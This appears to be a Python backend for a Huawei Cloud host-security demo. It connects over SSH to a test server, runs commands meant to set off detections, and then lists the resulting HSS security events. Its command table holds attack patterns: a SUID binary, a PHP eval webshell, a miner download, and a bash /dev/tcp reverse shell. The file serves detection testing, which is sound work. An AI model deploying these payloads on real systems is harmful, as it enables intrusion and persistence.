#!/usr/bin/env python3
"""HSS 真实后端：SSH 触发危险命令 + 查询 HSS 安全事件。

依赖 config.json（AK/SK）与 state.json（server_id/public_ip，由资源脚本产出）。
"""
import json
import os
import sys
import time

SKILL_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, SKILL_ROOT)

from lib.common import load_config, hss_client, ssh_exec
from huaweicloudsdkhss.v5 import ListHostStatusRequest, ListSecurityEventsRequest

COMMANDS = {
    "suid": 'f=/usr/bin/demo_$(date +%s%N); cp /bin/true "$f" && chmod u+s "$f" && echo "created $f"',
    "webshell": 'f=/tmp/shell_$(date +%s%N).php; echo "<?php @eval(\\$_POST[c]);?>" > "$f" && echo "created $f"',
    "miner": 'f=/tmp/xmrig_$(date +%s%N); curl -s http://127.0.0.1/xmrig -o "$f"; chmod +x "$f"; echo "created $f"',
    "revshell": 'timeout 5 bash -c "bash -i >& /dev/tcp/8.8.8.8/53 0>&1" 2>/dev/null; echo triggered',
}


class HssBackend:
    def __init__(self, manifest):
        self.manifest = manifest
        self.cfg = load_config()
        self.state = json.load(open(os.path.join(SKILL_ROOT, "state.json"), encoding="utf-8"))
        self.password = open(os.path.join(SKILL_ROOT, "demo_password.txt")).read().strip()
        self.cli = hss_client(self.cfg)

    def status(self):
        cards = []
        try:
            r = self.cli.list_host_status(ListHostStatusRequest(limit=50, refresh=True))
            agent, protect = "unknown", "closed"
            for h in (r.data_list or []):
                if h.host_id == self.state["server_id"]:
                    agent = getattr(h, "agent_status", None)
                    protect = getattr(h, "protect_status", None)
            cards = [
                {"label": "主机状态", "value": "ACTIVE", "tone": "green"},
                {"label": "HSS 防护", "value": "已开启" if protect == "opened" else str(protect), "tone": "green" if protect == "opened" else "red"},
                {"label": "Agent", "value": str(agent), "tone": "green" if agent == "online" else "red"},
                {"label": "区域", "value": self.cfg.get("region", ""), "tone": ""},
            ]
        except Exception:
            cards = [{"label": "HSS", "value": "查询失败", "tone": "red"}]
        return {"cards": cards}

    def execute(self, action):
        cmd = COMMANDS.get(action["id"])
        if not cmd:
            return {"ok": False, "error": f"动作 {action['id']} 无对应命令"}
        try:
            out = ssh_exec(self.state["public_ip"], self.password, cmd)
            return {"ok": True, "output": out}
        except Exception as e:
            return {"ok": False, "error": str(e)[:200]}

    def events(self):
        try:
            r = self.cli.list_security_events(
                ListSecurityEventsRequest(host_id=self.state["server_id"], limit=50))
            evs = []
            for e in (r.data_list or []):
                ts = int(getattr(e, "occur_time", 0) or 0)
                evs.append({
                    "name": getattr(e, "event_name", None),
                    "detail": getattr(e, "event_class_name", None) or "主机安全事件",
                    "severity": getattr(e, "severity", None) or "Low",
                    "time": time.strftime("%H:%M:%S", time.localtime(ts / 1000)) if ts else "",
                    "ts": ts,
                })
            evs.sort(key=lambda x: x["ts"], reverse=True)
            return {"total": r.total_num or 0, "events": evs}
        except Exception as e:
            return {"total": 0, "events": [], "error": str(e)[:200]}
